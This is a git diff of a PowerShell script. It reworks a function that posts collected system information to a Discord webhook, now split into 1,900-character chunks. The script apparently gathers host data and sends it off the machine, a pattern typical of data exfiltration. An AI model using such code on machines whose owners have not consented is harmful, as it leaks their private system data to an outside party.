@@ -421,24 +421,19 @@ Write-Host "Length of SystemInfo: $($SystemInfo.Length)"
 function Send-ToDiscord {
     param ($Message)
 
-    # Debug: Output the message length and first 100 characters
-    Write-Host "Send-ToDiscord called with message length: $($Message.Length)"
-    Write-Host "Message content (first 100 characters): $($Message.Substring(0, [Math]::Min(100, $Message.Length)))"
+    # Split the message into chunks of 1,900 characters
+    $chunks = $Message -split "(.{1,1900})(?=\s|$)"
+    
+    foreach ($chunk in $chunks) {
+        $payload = @{ content = "```$chunk```" } | ConvertTo-Json
 
-    # Escape special characters in the message for JSON compatibility
-    $escapedMessage = $Message -replace '\\', '\\\\' -replace '"', '\"' -replace '\n', '\\n' -replace '\r', ''
-
-    # Construct the JSON payload
-    $payload = @{ content = "
-$escapedMessage
-" } | ConvertTo-Json
-
-    try {
-        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType "application/json" -Body $payload
-        Write-Host "Data sent to Discord successfully."
-    } catch {
-        Write-Error "Failed to send data to Discord."
-        Write-Error $_.Exception.Message
+        try {
+            Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType 'application/json' -Body $payload
+            Write-Host "Chunk sent to Discord successfully."
+        } catch {
+            Write-Error "Failed to send chunk to Discord."
+            Write-Error $_.Exception.Message
+        }
     }
 }
 
